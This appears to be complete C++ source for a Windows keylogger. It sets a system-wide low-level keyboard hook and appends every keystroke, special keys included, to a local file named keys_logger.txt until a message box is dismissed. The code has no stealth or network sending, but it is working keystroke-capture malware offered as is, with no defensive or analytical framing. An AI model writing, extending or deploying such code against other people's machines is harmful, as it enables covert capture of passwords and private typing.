#define _WIN32_WINNT 0x0500
#include<fstream>
#include<windows.h>
#include <tchar.h>

using namespace std;

//instead of ofstream object
//we can use any simple function which will write the contents in the file after any key stroke.
ofstream out("keys_logger.txt", ios::out);

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

    if (wParam == WM_KEYDOWN)
    {
        switch (p->vkCode)
        {
            case VK_CAPITAL: out << "<CAPLOCK>"; break;
            case VK_SHIFT:  out << "<SHIFT>"; break;
            case VK_LCONTROL: out << "<LCTRL>"; break;
            case VK_RCONTROL: out << "<RCTRL>"; break;
            case VK_INSERT:  out << "<INSERT>"; break;
            case VK_END:  out << "<END>"; break;
            case VK_PRINT:  out << "<PRINT>"; break;
            case VK_DELETE:  out << "<DEL>"; break;
            case VK_BACK:  out << "<BK>"; break;
            case VK_LEFT:  out << "<LEFT>"; break;
            case VK_RIGHT:  out << "<RIGHT>"; break;
            case VK_UP:   out << "<UP>"; break;
            case VK_DOWN:  out << "<DOWN>"; break;

            default:   out << char(tolower(p->vkCode));
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0
    );

    MessageBox(NULL, _T("Press OK to stop key logging."), _T("Information"), MB_OK);
    out.close();
    return 0;
}